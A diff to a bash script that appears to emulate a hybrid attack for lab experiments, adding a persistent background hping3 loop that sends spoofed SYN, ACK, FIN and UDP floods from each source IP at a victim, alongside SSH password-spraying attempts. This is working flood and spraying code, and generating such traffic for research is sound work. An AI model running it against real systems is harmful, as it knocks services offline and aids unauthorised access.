@@ -50,6 +50,13 @@ stop_attack_children() {
   pkill -TERM -P $$ hping3 2>/dev/null || true
   pkill -TERM -P $$ sshpass 2>/dev/null || true
   pkill -TERM -P $$ ssh 2>/dev/null || true
+  # See the persistent flood block below: FLOOD_PIDS is only declared once the
+  # main loop reaches it, so this is a no-op before that point.
+  if declare -p FLOOD_PIDS >/dev/null 2>&1; then
+    for fp in "${FLOOD_PIDS[@]}"; do
+      kill "${fp}" 2>/dev/null || true
+    done
+  fi
 }
 
 watch_stop_signal() {
@@ -112,6 +119,48 @@ for src_ip in "${SOURCE_IPS[@]}"; do
     ip addr add "${src_ip}/16" dev "${iface}" 2>/dev/null || true
   fi
 done
+
+# --- Continuous network flood (decoupled from the SSH forensic loop) ---------
+# Same fix as distributed_password_spraying.sh: the per-round loop below fires
+# one hping3 burst PER source and then does ATTEMPTS_PER_PAIR real (slow,
+# timing-out) SSH attempts inside the same subshell before the round moves on
+# to the next user/source pair. hping3's burst finishes in well under a
+# second, but the subshell stays alive for the SSH attempts, so the network
+# rate collapses to ~0 between bursts — a sawtooth on the traffic figure
+# instead of the sustained flood a real volumetric attack produces. Also fixes
+# exp3's network attack running visibly weaker than exp1's despite both being
+# the same password-spraying opening move: this flood, not the round loop, is
+# what should set the sustained packet rate.
+#
+# Run the packet flood in its own persistent background loop, one worker per
+# source IP, each re-launching hping3 back-to-back with no gap — independent
+# of the SSH forensic cadence, which keeps providing the real auth-attempt
+# evidence unchanged.
+FLOOD_PIDS=()
+if [ "${NETWORK_FLOOD_ENABLED:-1}" = "1" ]; then
+  flood_start_epoch="$(date +%s)"
+  flood_seed=0
+  for flood_src in "${SOURCE_IPS[@]}"; do
+    flood_mode="${PROBE_MODES[$((flood_seed % ${#PROBE_MODES[@]}))]}"
+    (
+      while :; do
+        [ -f "${STOP_SIGNAL_FILE}" ] && exit 0
+        now_epoch="$(date +%s)"
+        if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "$((now_epoch - flood_start_epoch))" -ge "${ATTACK_DURATION_SECONDS}" ]; then
+          exit 0
+        fi
+        case "${flood_mode}" in
+          syn) hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -M $((1000 + flood_seed)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
+          ack) hping3 -q -i "u${HPING_INTERVAL_US}" -A -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -M $((2000 + flood_seed)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
+          fin) hping3 -q -i "u${HPING_INTERVAL_US}" -F -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -M $((3000 + flood_seed)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
+          udp) hping3 -q -i "u${HPING_INTERVAL_US}" -2 -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${flood_src}" -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true ;;
+        esac
+      done
+    ) &
+    FLOOD_PIDS+=("$!")
+    flood_seed=$((flood_seed + 1))
+  done
+fi
 
 start_epoch="$(date +%s)"
 round_count=0
@@ -310,5 +359,7 @@ while :; do
     sleep "${SLEEP_SECONDS}"
   done
 done
+
+stop_attack_children
 
 echo "Hybrid lateral emulation completada tras ${round_count} rondas. Evidencia: ${OUTPUT_FILE}"
